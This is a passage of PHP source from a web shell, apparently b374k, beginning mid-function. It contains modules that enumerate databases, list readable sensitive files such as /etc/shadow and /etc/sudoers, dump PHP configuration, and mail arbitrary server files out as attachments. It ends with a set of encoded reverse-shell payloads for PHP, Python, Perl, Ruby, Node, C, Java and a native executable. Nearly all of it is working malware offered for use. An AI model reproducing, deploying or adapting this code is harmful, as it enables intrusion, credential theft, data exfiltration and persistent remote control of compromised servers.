$showdb = "SELECT schema_name FROM information_schema.schemata"; elseif($type=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME"; elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = "SELECT \"".$host."\""; else $showdb = "SHOW DATABASES"; $query_db = sql_query($type, $showdb, $con); if($query_db!=false) { while($db_arr = sql_fetch_data($type, $query_db)){ foreach($db_arr as $db){ if($type=='mysql') $showtbl = "SHOW TABLES FROM ".$db; elseif($type=='mssql') $showtbl = "SELECT name FROM ".$db."..sysobjects WHERE xtype = 'U'"; elseif($type=='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$db."'"; elseif($type=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$db."'"; elseif(($type=='sqlite3') || ($type=='sqlite')) $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; else $showtbl = ""; $res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>".$db."</p><table class='border' style='display:none;margin:8px 0;'>"; $query_table = sql_query($type, $showtbl, $con); if($query_table!=false){ while($tables_arr = sql_fetch_data($type, $query_table)){ foreach($tables_arr as $table) $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>".$table."</td></tr>"; } } $res .= "</table>"; } } } } } } if(!empty($res)) output($res); output('error');
} $GLOBALS['module']['info']['id'] = "info";
$GLOBALS['module']['info']['title'] = "Info";
$GLOBALS['module']['info']['js_ontabselected'] = "";
$GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>"; if(!function_exists('info_getinfo')){ function info_getinfo(){ $res = ""; $res .= "<p class='boxtitle' onclick=\"info_toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>"; $res .= "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>"; if(is_win()){ foreach (range("A", "Z") as $letter){ if(is_readable($letter.":\\")){ $drive = $letter.":"; $res .= "<tr><td>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>"; } } } else $res .= "<tr><td>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>"; $res .= "<tr><td>php</td><td>".phpversion()."</td></tr>"; $access = array("python"=>"python -V", "perl"=>"perl -e \"print \$]\"", "python"=>"python -V", "ruby"=>"ruby -v", "node"=>"node -v", "nodejs"=>"nodejs -v", "gcc"=>"gcc -dumpversion", "java"=>"java -version", "javac"=>"javac -version" ); foreach($access as $k=>$v){ $version = execute($v); $version = explode("\n", $version); if($version[0]) $version = $version[0]; else $version = "?"; $res .= "<tr><td>".$k."</td><td>".$version."</td></tr>"; } if(!is_win()){ $interesting = array( "/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases", "/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf", "/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf", "/etc/ssh/sshd_config", "/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf", "/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"); foreach($interesting as $f){ if(@is_file($f) && @is_readable($f)) $res .= "<tr><td>".$f."</td><td><a data-path='".html_safe($f)."' onclick='view_entry(this);'>".$f." is readable</a></td></tr>"; } } $res .= "</table></div>"; if(!is_win()){ if($i_buff=trim(read_file("/proc/cpuinfo"))){ $res .= "<p class='boxtitle' onclick=\"info_toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>"; $res .= "<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>"; $i_buffs = explode("\n\n", $i_buff); foreach($i_buffs as $i_buffss){ $i_buffss = trim($i_buffss); if($i_buffss!=""){ $i_buffsss = explode("\n", $i_buffss); $res .= "<table class='dataView'>"; foreach($i_buffsss as $i){ $i = trim($i); if($i!=""){ $ii = explode(":",$i); if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>"; } } $res .= "</table>"; } } $res .= "</div>"; } if($i_buff=trim(read_file("/proc/meminfo"))){ $res .= "<p class='boxtitle' onclick=\"info_toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>"; $i_buffs = explode("\n", $i_buff); $res .= "<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>"; foreach($i_buffs as $i){ $i = trim($i); if($i!=""){ $ii = explode(":",$i); if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>"; } else $res .= "</table><table class='dataView'>"; } $res .= "</table></div>"; } if($i_buff=trim(read_file("/proc/partitions"))){ $i_buff = preg_replace("/\ +/", " ", $i_buff); $res .= "<p class='boxtitle' onclick=\"info_toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>"; $res .= "<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>"; $i_buffs = explode("\n\n", $i_buff); $res .= "<table class='dataView'><tr>"; $i_head = explode(" ", $i_buffs[0]); foreach($i_head as $h) $res .= "<th>".$h."</th>"; $res .= "</tr>"; $i_buffss = explode("\n", $i_buffs[1]); foreach($i_buffss as $i_b){ $i_row = explode(" ", trim($i_b)); $res .= "<tr>"; foreach($i_row as $r) $res .= "<td style='text-align:center;'>".$r."</td>"; $res .= "</tr>"; } $res .= "</table>"; $res .= "</div>"; } } $phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES); foreach($phpinfo as $p=>$i){ $res .= "<p class='boxtitle' onclick=\"info_toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>"; ob_start(); eval("phpinfo(".$i.");"); $b = ob_get_contents(); ob_end_clean(); if(preg_match("/<body>(.*?)<\/body>/is", $b, $r)){ $body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]); $body = str_replace("<table", "<table class='boxtbl' ", $body); $body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body); $body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body); $body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body); $res .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>"; } } $res .= "<span class='button colSpan' onclick=\"info_refresh();\" style='margin-bottom:8px;'>refresh</span><div style='clear:both;'></div>"; return $res; }
} if(isset($p['infoRefresh'])){ output(info_getinfo());
} $GLOBALS['module']['mail']['id'] = "mail";
$GLOBALS['module']['mail']['title'] = "Mail";
$GLOBALS['module']['mail']['js_ontabselected'] = "if(!portableMode) $('#mailFrom').focus();";
$GLOBALS['module']['mail']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Mail</p></th></tr>
</thead>
<tbody id='mailTBody'> <tr><td style='width:120px'>From</td><td colspan='2'><input type='text' id='mailFrom' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr> <tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr> <tr><td>Subject</td><td><input type='text' id='mailSubject' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>
</tbody>
<tfoot> <tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr> <tr> <td colspan='2'><span style='width:120px;' class='button' onclick=\"mail_send();\">send</span> <span style='width:120px;' class='button' onclick=\"mail_attach();\">attachment</span> </td> </tr> <tr><td colspan='2'><span id='mailResult'></span></td></tr>
</tfoot>
</table>
"; if(!function_exists('send_email')){ function send_email($from, $to, $subject, $msg, $attachment){ $headers = "MIME-Version: 1.0\r\n".$from; $rand = md5(time()); $headers .= "Content-Type: multipart/mixed; boundary=\"".$rand."\"\r\n\r\n"; $headers .= "--".$rand."\r\n"; $headers .= "Content-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n"; $headers .= $msg."\r\n\r\n"; if(count($attachment)>0){ foreach($attachment as $file){ if(is_file($file)){ $content = chunk_split(base64_encode(read_file($file))); $headers .= "--".$rand."\r\n"; $headers .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\r\n"; $headers .= "Content-Transfer-Encoding: base64\r\n"; $headers .= "Content-Disposition: attachment\r\n\r\n"; $headers .= $content."\r\n\r\n"; } } } $headers .= "--".$rand."--\r\n"; if(@mail($to, $subject, "", $headers)) return true; return false; }
} if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){ $mailFrom = trim($p['mailFrom']); $mailTo = trim($p['mailTo']); $mailSubject = trim($p['mailSubject']); $mailContent = trim($p['mailContent']); $mailAttachment = trim($p['mailAttachment']); $mailAttachment = (!empty($mailAttachment))? explode("{[|b374k|]}", $p['mailAttachment']):array(); if(empty($mailTo)) output("Please specify at least one recipient"); if(!empty($mailFrom)){ $mailFrom = "From: ".$mailFrom."\r\nReply-To: ".$mailFrom."\r\n"; } foreach($mailAttachment as $file){ $file = trim($file); if(empty($file)) continue; if(!is_file($file)) output("No such file : ".$file); } if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($mailTo)); output("Failed to send mail");
} $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"";
$remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
$default_port = 13123;
$winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":""; $GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G";
$GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc=";
$GLOBALS['resources']['rs_perl'] = "lZJhb9MwEIY/17/CZF6bSIG0DAmpJhVVmqFqa1PFHQhRiNL0WKylcRS7rKgrvx0ny2gEQoJ8sO5en56zHuXsmbOTpbPmuQP5N1xAmaEznCpVyKHj3HKV7tYvErF11hevX909nmgnAU+D4ZCJ5A4URURIl3wJdCFT14B9IUqFl344c/cKyi1dsIHbW5HFh8lq1KPNvQ5pvVem+Dk3KOJfzQr0Y+vc65Rbh5p27gUztvC9c+xcGfSIiHJvQRWlUGL9PY+3YPZUUvQsimT9GpPZ3cVlNJ37S7vLAu8qYsvQH89soqyHhw0H06pXvR2H79677sA6oA4pXFK1n/qfKepIUBVKFBWLBddRRdE0FkShf8P88WQS2gNN6ejXb/RMNR1vNmXEc5MU9nReTUTj+UfrtLGTcakg19MXrTBOEtBrPJtZ9WKN82yjloxlClmGhzgReQ6Jgs0qN+x+NScKyDFbTqZz23jT9Qz6FAQ3S9sYtRM/DJsEdWAPCdZOT+uTTEgwPYs+FuxXUbFbjea2Os20ahxXuE8ROiLI5Mnoyz+NkrTpBnXHXZ6DimIltK+0pYPE7m8uCW9dNya0QxK34lob+zdtZqNt1GWGRZ+Sxls7asRV0d/N/ZewWhMcKm2m/nuOSH8/AQ==";
$GLOBALS['resources']['rs_ruby'] = "tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$GLOBALS['resources']['rs_node'] = "nVHLbsIwEDwbiX+IcokjIVsqSJVAnPoJPdKHjLNgq46T2g5UQvx7/QgU6ENVcrCyO7Ozu7OUZsK51s4p3UonujXhTU3X0/vZW3rHox0zmW3ZXmfLzMB7Jw3gggupqtfWNBysLUoSCYtE1uAuqT4syh6yzgCrL9GUORN4o22j4KpVSkVKryJAKU8p6FpqakXhEbnB/TSkVcxtGlOTmjkuMH3Ze5Ysy686XlcEPqA4KzKz3XngpBDCpBn+iAK9dWK5nJaH8QgFvvBkvxfhfngHj2B2YPCm09zJRmMbeciSvZEOcB6N7LvPw4oauIPqSedhp6z/0mZeOHqJI/0St4JYV0lNDNiuBlzeQk3niO+eV8yxfHKaJsMhLg+naWK0OH5XBmMGlv9Vdhr6WzVKryBKWgc6Or26ew7J43gEykJ26//s7L+98v8hORqs71Um8aKraZT77yHQbxdAP1iPBnqOBpqNhrl8/AQ=";
$GLOBALS['resources']['rs_gcc'] = "rVJhb9owEP0Mv8JjU+tQj5C006TSVEKFSWgtRMA0TRuKgmPIqcGOYjNBp/732nFgwLRJk/ohyd27l3f2vXObKFUql9euuwSVructKlbu/PLj1aN9o6ZbfwucZuuEoRupEhCt9PYIKoAvT7Ekg/kJtpWu2uZM/glLQR+ZOsY5U6AfF/gxvuag1Q0GXKFVDBybIC6WlNA0LlBThz+/z5xf9ZopSEKJCLxOvaYPuqYa0M3iJCki4Ag0DAtsfg4C3/xSg5YEHi3iFWTboPspGgz7084ez0WhglQJLnGsBOCylzdznN8Uo92S5adkZngw7PZ646g7/FbSZGDviyt1MhndfY4m03G/+0DalsKU4YhcYanL95GhlMxo3P8y6Rs9ciaIhCcmFlhU/Rf4jXTYBhS2MnPgiRbAJzdHTecMSHvjWVamB8q45n0oUxrElLKyc3t/HK1DScMuhExZlqFrRAXnjCqW/OAN4l9V3GSd+5p7lHiHiW8lt7rpCjfYxowUTfvjh2CjWLHqhBMvOH8Xfu3dnneqqoZ0yChy9Y1cmaL30LBnzYRkmJr4uV5jmWRob+fl69tpFrKMLNGf2Sk/sULsEKJnnelp7ggX3sUhstP+5w4MwnA8mo6i6V248xVXw/6rm9UmnNQcx7lpH25E6aT8DyflceIdJq/vpLROPtdfAA==";
$GLOBALS['resources']['rs_java'] = "lVRNb9swDD2nQP+D4JM9BHaTDdjWIsOwYYcBAzosvXXBICuMrdWWBYnOB9L891Gy7LhrLz1Ekcgn8vGRcpaxElHb6ywrJJZtnoqmzvK37989dOvlhax1Y5D95VueyiZ9c/PUpAC97fJCt3klBRMVt5b5y3+MPV5eTLSRW47ALHIkwEYqXgWYRgZ7BLW27K40wNcOP1z4rnSLSyR7zaS9GbtuWzz7mhY9A3J3HDTGT+9On11IjlhKm0q7oMh+S8aFi3TqQn2+3YIxcg2juNtGrplpVZx4nhM0h24zyQ8I9yuWswVTsGP++GH2cb666fxSIRPkpDyuzDhPgmNXygpi8WlxlbAQa0Is0p2RCHE+vZqKHurtm6q1ZTyYXox58n/dKjiKMv62F6BRNopBcoSUVFSkBRcPd4YLoHAe7Jau+lBv6Jgvu+ZSxaSfVAUVyk1hOxFcZW4cfO7Oz0S9Jl5RlkuV2TLyLrmJlweLUKcF4E/TaDB4iKPGporXECUpNj+aHZiv3BKhVKo17G83cbSTKkqcPMcQlf6ijm/ItnNWP3DMllBV7JqJRikQCOvfqss+6s/OEfhCZxtkXDbiAZCVoXfdMfiGDhN9V3NagSqwXCxmYQQm/iksaFYRCjCp5sYCHTz6/mrV92QJhuYppLJ9qpExdoF6tONiUy5c1/pmd/2EygL7n8z8tWQ64aQmrHfNVqPEIxGknrIRr9PLUrDHR/Yyn/ErLKQru3Tqj8zDKD95oEUzYMf2AUz+/oX0JhopAe6TQhd/tQplDe562NJEwR5ETMOThG8FqUWTOwsFk876GbWpI9IncOj5GV24r4p+znCAz1J6Psa1T8+H7VlGv7ziddLv9A8=";
$GLOBALS['resources']['rs_executable'] = "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